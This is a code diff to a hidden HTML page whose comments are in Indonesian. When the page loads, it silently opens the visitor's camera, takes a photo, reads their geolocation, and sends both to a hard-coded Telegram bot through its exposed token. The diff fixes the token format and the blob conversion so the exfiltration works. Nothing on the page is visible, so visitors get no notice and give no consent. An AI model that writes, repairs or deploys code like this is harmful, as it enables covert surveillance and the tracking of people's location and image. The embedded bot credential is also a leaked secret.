@@ -2,20 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Capture & Send</title>
+  <title>Capture & Send to Telegram</title>
 </head>
 <body style="display:none;">
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const botToken = 'bot7927041124:AAHuSSavc_9B1BLJDo91nIz4bO_fih2gLro';
+    const botToken = '7927041124:AAHuSSavc_9B1BLJDo91nIz4bO_fih2gLro';
     const chatId = '7041008009';
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], { type: mime });
+    }
 
     async function sendToTelegram(imageData, latitude, longitude) {
       try {
-        // 1. Kirim Foto
-        const blob = await (await fetch(imageData)).blob();
+        // Kirim foto
+        const blob = dataURLtoBlob(imageData);
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'photo.jpg');
@@ -25,7 +37,7 @@
           body: formData
         });
 
-        // 2. Kirim Lokasi
+        // Kirim lokasi
         await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
           method: 'POST',
           headers: {
@@ -37,6 +49,8 @@
             longitude
           })
         });
+
+        console.log("Data berhasil dikirim ke Telegram.");
       } catch (err) {
         console.error("Gagal mengirim ke Telegram:", err);
       }
@@ -49,10 +63,9 @@
         const canvas = document.getElementById('canvas');
         video.srcObject = stream;
 
-        // Tunggu sampai video siap
         await new Promise(resolve => video.onloadedmetadata = resolve);
 
-        // Ambil frame
+        // Ambil frame dari video
         const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -63,18 +76,22 @@
         stream.getTracks().forEach(track => track.stop());
 
         // Ambil lokasi
-        navigator.geolocation.getCurrentPosition((position) => {
-          const { latitude, longitude } = position.coords;
-          sendToTelegram(imageData, latitude, longitude);
-        }, (err) => {
-          console.error("Gagal mengambil lokasi:", err);
-        });
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude } = position.coords;
+            sendToTelegram(imageData, latitude, longitude);
+          },
+          (err) => {
+            console.error("Gagal mendapatkan lokasi:", err);
+          }
+        );
 
       } catch (err) {
-        console.error("Gagal akses kamera atau lainnya:", err);
+        console.error("Gagal akses kamera:", err);
       }
     }
 
+    // Mulai otomatis
     captureAndSend();
   </script>
 </body>
